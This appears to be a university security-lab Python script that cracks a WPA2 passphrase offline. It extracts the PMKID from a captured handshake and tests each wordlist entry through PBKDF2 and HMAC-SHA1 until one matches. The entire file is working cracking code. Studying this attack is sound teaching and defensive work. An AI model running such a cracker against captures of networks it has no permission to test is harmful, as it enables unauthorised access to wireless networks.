#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

import struct
from curses import KEY_A1
from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
from bitstring import BitArray




def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap")

# Used to get Nonce AP
handshake_m1 = wpa[145]
# Used to get the SSID
broadcast_message_ap = wpa[0]

# Important parameters for key derivation - most of them can be obtained from the pcap file
ssid        = broadcast_message_ap.info.decode('utf-8')
APmac       = a2b_hex(handshake_m1.addr2.replace(':', ''))
Clientmac   = a2b_hex(handshake_m1.addr1.replace(':', ''))
pmkid_to_test = handshake_m1.original[-20:-4] # get pmkid
PMKID_CONST = b'PMK Name'
data = PMKID_CONST + APmac + Clientmac

print(pmkid_to_test.hex())
print ("\n\nValues used to derivate keys")
print ("============================")
print ("SSID: ",ssid,"\n")
print ("AP Mac: ",b2a_hex(APmac),"\n")
print ("CLient Mac: ",b2a_hex(Clientmac),"\n")

wordlist = "wordlist.txt"

f = open(wordlist, "r")

print("Testing passphrases")
print("=============================")

success = False

for phrase in f:
    phrase = phrase.strip('\n')
    print("Testing: ", phrase)
    pmk = pbkdf2(hashlib.sha1, str.encode(phrase), str.encode(ssid), 4096, 32)

    pmkid = hmac.new(pmk, data, hashlib.sha1).hexdigest()

    print(pmkid[:-8])
    print(pmkid_to_test.hex())

    if pmkid[:-8] != pmkid_to_test.hex():
        continue

    success = True


    print("\nPassphrase is : ", phrase)
    print("=============================")
    print("\nResults of the key expansion")
    print("=============================")
    print("PMK:\t\t", pmk.hex(), "\n")
    print("PMKID:\t\t", pmkid, "\n")

    break

if not success:
    print("\nNo passphrase found")
    print("=============================")

f.close()



